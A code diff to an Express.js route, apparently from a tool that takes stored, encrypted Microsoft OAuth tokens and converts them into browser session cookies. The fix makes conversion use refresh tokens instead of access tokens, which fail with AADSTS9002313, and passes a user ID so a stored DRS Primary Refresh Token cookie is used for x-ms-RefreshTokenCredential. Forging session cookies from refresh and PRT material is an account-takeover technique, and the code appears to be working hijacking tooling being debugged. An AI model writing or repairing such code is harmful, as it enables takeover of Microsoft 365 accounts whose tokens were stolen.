@@ -1159,11 +1159,16 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     }
 
     const token = tokens[0];
-    const accessToken = safeDecrypt(token.access_token_encrypted);
     const refreshToken = safeDecrypt(token.refresh_token_encrypted);
 
-    if (!accessToken && !refreshToken) {
-      return res.status(400).json({ error: 'No tokens available for conversion' });
+    // The token endpoint is called with grant_type: 'refresh_token', so an
+    // access token submitted here is rejected with AADSTS9002313 ("Invalid
+    // request. Request is malformed or invalid."). Always prefer the refresh
+    // token; only fall back to the access token when none exists.
+    if (!refreshToken) {
+      return res.status(400).json({
+        error: 'No refresh token available for conversion. Use the Refresh button to renew this token first.'
+      });
     }
 
     const cookieConverter = require('../services/cookieconverter');
@@ -1171,12 +1176,16 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     const tenant = token.tenant || config.AZURE_TENANT || 'common';
     const accountType = token.account_type || 'unknown';
 
+    // Signature: convertTokensToCookies(inputToken, templateType, tenant, email, accountType, userId)
+    // userId is required or the stored DRS PRT cookie is never used for
+    // x-ms-RefreshTokenCredential (see the userId guard in cookieconverter.js).
     const result = await cookieConverter.convertTokensToCookies(
-      accessToken || refreshToken,
+      refreshToken,
       templateType,
       tenant,
-      token.prt || null,
-      accountType
+      token.email || null,
+      accountType,
+      req.user.id
     );
 
     if (result.success && result.cookies) {
@@ -1222,7 +1231,11 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
       return res.status(400).json({ error: 'Access token or refresh token is required' });
     }
 
-    const tokenToUse = access_token || refresh_token;
+    // grant_type is always 'refresh_token' on the Microsoft token endpoint,
+    // so submitting an access token here fails with AADSTS9002313
+    // ("Invalid request. Request is malformed or invalid."). Prefer the
+    // refresh token when the caller supplied both.
+    const tokenToUse = refresh_token || access_token;
     const cookieConverter = require('../services/cookieconverter');
     const result = await cookieConverter.convertTokensToCookies(
       tokenToUse,
